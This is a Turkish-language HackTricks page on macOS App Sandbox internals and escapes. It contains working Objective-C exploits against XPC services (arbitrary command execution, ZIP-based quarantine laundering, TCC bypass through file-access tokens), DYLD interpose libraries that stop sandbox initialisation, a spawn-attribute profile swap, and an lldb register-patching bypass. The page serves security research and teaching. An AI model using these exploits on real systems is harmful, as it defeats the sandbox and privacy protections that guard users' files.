# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox yükleme süreci

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Görsel kaynağı: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Önceki görselde, **`com.apple.security.app-sandbox`** entitlement'ına sahip bir uygulama çalıştırıldığında **sandbox'ın nasıl yüklendiği** görülebilir.

Derleyici, `/usr/lib/libSystem.B.dylib` dosyasını binary'ye bağlar.

Ardından **`libSystem.B`**, **`xpc_pipe_routine`** uygulamanın entitlement'larını **`securityd`**'ye gönderene kadar çeşitli fonksiyonları çağırır. Securityd, sürecin sandbox içine alınması gerekip gerekmediğini denetler ve gerekiyorsa süreci sandbox içine alır.\
Son olarak, **`__sandbox_ms`** çağrısıyla sandbox etkinleştirilir; bu fonksiyon da **`__mac_syscall`**'ı çağırır.<sup>[[1]](#references)[[3]](#references)</sup>

## Olası Bypass'lar

### Quarantine attribute'u bypass etme

**Sandboxed süreçler tarafından oluşturulan dosyalara**, sandbox'tan kaçışları önlemek için **quarantine attribute'u** eklenir: Yeni bir uygulama bırakıp çalıştırmaya kalkarsanız quarantine flag'i bunu engeller. Bu nedenle, **quarantine attribute'u *olmayan* bir dosya veya klasör bırakabilirseniz App Sandbox'tan kaçabilirsiniz** — yalnızca bir `.app` bundle'ı bırakıp `open` ile çalıştırın; çünkü yeni başlatılan süreç sandbox'ınız altında değil, LaunchServices altında çalışır.

**Quarantine uygulanmamış bir dosya bırakmanın** güvenilir yolu, **başka bir süreçten sizin için dosyayı oluşturmasını istemektir**. Mickey Jin'in [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) yazısında belgelendiği üzere, **App Sandbox** bırakılan dosyaları quarantine ile işaretlerken **Service Sandbox** altında çalışan XPC servisleri bunu yapmaz. Bu nedenle, kimlik doğrulaması gerektirmeyen çeşitli XPC servisleri "quarantine laundering" için bir primitive olarak kullanılabilir:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) ve **CVE-2023-32414** (`ArchiveService`): Sandboxed bir uygulamanın gönderdiği arşivi, **çıkarılan içeriğe quarantine xattr'ını taşımadan** istenen konuma çıkarır.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` içindeki path traversal, **quarantine olmadan rastgele dizinler oluşturmayı** sağlıyordu; bu, container dışındaki tüm `.app` bundle yapısını oluşturmak için yeterlidir.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): Quarantine uygulanmış bir DMG'yi **çıkan cihaza quarantine uygulamadan** bağlar; böylece bağlanan volume'daki uygulamalar çalıştırılabilir.

> [!TIP]
> Çıkarma işlemi genellikle **çalıştırılabilir izin bitini kaldırır**. CVE-2023-27944'te kullanılan geçici çözüm, bundle'ın ana executable'ı olarak mevcut, imzalı bir sistem binary'sine (ör. `/System/Library/CoreServices/Automator Application Stub`) bir **symlink** yerleştirmekti; böylece bırakılan dosyada `+x` izni gerekmeden çalıştırılabilir durumda kalıyordu.

> [!CAUTION]
> Bunun işe yaramasının nedeni, denetimin **çalıştırılan öğenin flag'i** üzerinden yapılmasıdır: *"Finder veya GUI üzerinden bir uygulama ya da başka bir executable code çalıştırıldığında macOS, yüklemeden önce quarantine flag'ini denetler"* ve ancak bundan sonra *"tam 'ilk çalıştırma' güvenlik denetimleri için Gatekeeper'a devredilir"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Çalıştırdığınız bundle'da flag yoksa Gatekeeper denetimi de yapılmaz — yukarıdaki CVE'lerin sağladığı primitive tam olarak budur.<sup>[[5]](#references)</sup>
>
> `.app` bundle'ının çalıştırılması için önceden izin verilmişse (üzerinde "authorized to run" flag'ine sahip bir quarantine xattr varsa), bunu da kötüye kullanabilirsiniz... ancak artık bazı ayrıcalıklı TCC izinlerine sahip değilseniz **`.app`** bundle'larının içine yazamazsınız; sandbox içinde bu izinlere sahip olmazsınız.

### Open işlevselliğini kötüye kullanma

[**Word sandbox bypass'ın son örneklerinde**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), **`open`** CLI işlevselliğinin sandbox'ı bypass etmek için nasıl kötüye kullanılabileceği görülebilir.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agent'lar/Daemon'lar

Bir uygulamanın **sandboxed olması amaçlanmış** olsa bile (`com.apple.security.app-sandbox`), örneğin **LaunchAgent**'tan (`~/Library/LaunchAgents`) çalıştırılırsa sandbox'ı bypass etmek mümkündür.\
[**Bu yazıda**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı üzere, sandboxed bir uygulamayla persistence elde etmek istiyorsanız uygulamayı LaunchAgent olarak otomatik çalışacak şekilde ayarlayabilir ve belki de DyLib environment variable'ları aracılığıyla kötü amaçlı kod enjekte edebilirsiniz.<sup>[[6]](#references)</sup>

### Auto Start konumlarını kötüye kullanma

Sandboxed bir süreç, **daha sonra sandboxed olmayan bir uygulamanın binary'yi çalıştıracağı** bir konuma **yazabiliyorsa**, binary'yi oraya **bırakarak sandbox'tan kaçabilir**. Bu tür konumlara iyi örnekler: `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`.

Bunun için **2 adım** gerekebilir: **Daha izin verici bir sandbox'a** (`file-read*`, `file-write*`) sahip bir süreçten, kodunuzu çalıştırmasını isteyin; bu kod da **sandbox dışında çalıştırılacağı** bir konuma yazma işlemini gerçekleştirsin.

**Auto Start konumları** hakkındaki bu sayfaya göz atın:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Diğer süreçleri kötüye kullanma

Sandboxed süreçten, daha az kısıtlayıcı sandbox'larda (ya da hiç sandbox olmadan) çalışan **diğer süreçleri ele geçirebiliyorsanız**, onların sandbox'larına geçerek kaçabilirsiniz:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Kullanılabilir System ve User Mach servisleri

Sandbox ayrıca `application.sb` profilinde tanımlanan XPC aracılığıyla belirli **Mach servisleriyle** iletişim kurmaya izin verir. Bu servislerden birini **kötüye kullanabilirseniz**, **sandbox'tan kaçabilirsiniz**.

[Bu yazıda](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) belirtildiği üzere, Mach servisleri hakkındaki bilgiler `/System/Library/xpc/launchd.plist` dosyasında tutulur. Bu dosyada `<string>System</string>` ve `<string>User</string>` aramaları yaparak tüm System ve User Mach servislerini bulmak mümkündür.<sup>[[4]](#references)</sup>

Ayrıca, `bootstrap_look_up` çağrısı yaparak bir Mach servisinin sandboxed uygulama tarafından kullanılabilir olup olmadığını denetlemek mümkündür:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Kullanılabilir PID Mach services

Bu Mach services, [bu yazıda sandbox'tan kaçmak için](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) ilk kez kötüye kullanıldı. O zamana kadar, bir uygulamanın ve framework'ünün ihtiyaç duyduğu **tüm XPC services**, uygulamanın PID domain'inde görünür durumdaydı (bunlar, `ServiceType` değeri `Application` olan Mach Services'tir).<sup>[[4]](#references)</sup>

**Bir PID Domain XPC service ile iletişim kurmak** için, uygulama içinde şu tür bir satırla kaydetmek yeterlidir:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Ayrıca, `System/Library/xpc/launchd.plist` içinde `<string>Application</string>` araması yaparak tüm **Application** Mach servislerini bulmak mümkündür.

Geçerli xpc servislerini bulmanın bir başka yolu da şunlardakileri kontrol etmektir:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Bu tekniği kötüye kullanan birkaç örneği [**orijinal yazıda**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) bulabilirsiniz; aşağıda özetlenmiş bazı örnekler yer alıyor.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Bu servis, her XPC bağlantısına her zaman `YES` döndürerek izin verir ve `runTask:arguments:withReply:` yöntemi, rastgele parametrelerle rastgele bir komut çalıştırır.

Exploit "şu kadar basitti":

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Bu XPC service, her zaman `YES` döndürerek tüm istemcilere izin veriyordu ve `createZipAtPath:hourThreshold:withReply:` yöntemi, klasörün yolunu kabul edip onu bir ZIP dosyasına sıkıştırıyordu.

Bu nedenle sahte bir uygulama klasör yapısı oluşturup sıkıştırmak, ardından dosyaları çıkarıp çalıştırarak sandbox'tan kaçmak mümkündür; çünkü yeni dosyalarda quarantine attribute bulunmaz.

Exploit şu şekildeydi:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Bu XPC servisi, herhangi bir bağlantıyı kabul eden `extendAccessToURL:completion:` yöntemi aracılığıyla XPC istemcisine herhangi bir URL’ye okuma ve yazma erişimi sağlar. XPC servisinde FDA bulunduğundan, bu izinleri kötüye kullanarak TCC’yi tamamen atlatmak mümkündür.

Exploit şu şekildeydi:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Statik Derleme ve Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı atlatmanın 2 yolunu keşfetti. Çünkü Sandbox, **libSystem** kütüphanesi yüklendiğinde userland tarafından uygulanır. Bir binary bu kütüphaneyi yüklemekten kaçınabilirse Sandbox'a hiç alınmaz:<sup>[[2]](#references)</sup>

- Binary **tamamen statik olarak derlenmişse**, bu kütüphaneyi yüklemekten kaçınabilir.
- **Binary'nin herhangi bir kütüphane yüklemesi gerekmiyorsa** (çünkü linker da libSystem içindedir), libSystem'i yüklemesi gerekmez.

### Shellcodes

ARM64'te **shellcode'ların bile** `libSystem.dylib` ile bağlanması gerektiğini unutmayın:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Devralınmayan kısıtlamalar

**[Bu yazının bonus bölümünde](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** açıklandığı gibi, aşağıdaki gibi bir sandbox kısıtlaması:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

örneğin yeni bir process çalıştırılarak bypass edilebilir:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Ancak elbette, bu yeni süreç üst süreçten entitlements veya ayrıcalıklar devralmaz.

### Spawn attributes ile devralınan sandbox'ı değiştirme (eski macOS sürümleri)

Normal bir `posix_spawn()` çocuğu, üst sürecinin sandbox'ını devralır. Şubat 2026 düzeltmesinden önceki macOS sürümlerinde sandbox'lı bir üst süreç, `posix_spawnattr_setmacpolicyinfo_np()` aracılığıyla `Sandbox` MAC policy'ye bunun yerine **yerleşik bir profil adı** iletebiliyordu. Böylece çocuk, üst sürecin kısıtlamaları yerine bu profili alıyordu. Yerleşik `no-network` profili kullanıcının home dizinine erişime hâlâ izin veriyordu; bu nedenle `/bin/bash` gibi bir çocuk, App Sandbox üst sürecinin erişemediği dosyalar üzerinde işlem yapabiliyordu. Bu, ayrı bir servisin süreci başlattığı [LaunchServices `open` yöntemi](#not-inherited-restrictions) ile aynı değildir. Genel girdi yoluna ilişkin bilgi için [MACF policy'ye özgü spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) bölümüne bakın.<sup>[[7]](#references)</sup>

Bu sınırı **etkilenen, izole edilmiş bir macOS host'unda** test etmek için, uygulama container'ının dışındaki home dizininde zararsız bir canary oluşturun. Aynı çocuğu önce normal `posix_spawn()` ile, sonra `no-network` seçen bir Sandbox spawn-attribute blob'u ile zaten sandbox'lı bir üst süreçten başlatın; çocuğun canary'yi okuyup okuyamadığını karşılaştırın. Aşağıdaki parça, Siguza'nın [örnek launcher'ındaki](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) private `sandbox_spawnattr_t` tanımını ve fonksiyon bildirimlerini kullanır. Bunu bir test uygulamasına entegre ederken normal hata işleme kodu ekleyin.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Başarılı bir `posix_spawn()` dönüşü, sandbox'tan çıkıldığını kanıtlamaz: **alt sürecin etkin dosya erişimini** sıradan alt süreç için geçerli temel durumla karşılaştırın. Yamalanmış sistemler, sandbox içindeki bir çağıranın istediği yerleşik profili, çağıranın özel `com.apple.private.security.sandbox-spawnattrs` entitlement'ı yoksa reddeder. Bu tarihsel davranışı güncel bir bypass olarak değerlendirmeyin.<sup>[[7]](#references)</sup>

### Entitlements

Bir uygulama belirli bir **entitlement**'a sahip olsa bile bazı **eylemlerin** sandbox tarafından **izinli olabileceğini** unutmayın; örneğin:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

**Interposting** hakkında daha fazla bilgi için şuraya bakın:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Sandbox'ı önlemek için `_libsecinit_initializer`'a Interpost uygulama

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Sandbox'ı engellemek için `__mac_syscall`'e interpose et

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### lldb ile Sandbox'ı debug etme ve bypass etme

Sandbox'a alınması gereken bir uygulama derleyelim:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Ardından uygulamayı derleyin:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Uygulama **`~/Desktop/del.txt`** dosyasını **okumaya** çalışacak, ancak **Sandbox** buna izin vermeyecek.\
> Sandbox aşıldığında dosyayı okuyabileceği için buraya bir dosya oluşturun:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Sandbox'ın ne zaman yüklendiğini görmek için uygulamada debug yapalım:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Sandbox aşılmış olsa bile TCC**, kullanıcıya işlemin masaüstündeki dosyaları okumasına izin verip vermediğini soracaktır

## References

- [1] [Jonathan Levin - Apple Sandbox: Bataklığın Derinliklerine (HITB GSEC 2016 slaytları)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Bataklığın Derinliklerine (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Escape'lerinde Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Açıklayıcı: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injection kullanarak Telegram ile macOS TCC Bypass (Bölüm 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Bir Executable Başlatarak Apple Sandbox'tan Kaçış](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - Yerleşik profiller için sandbox-exec](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
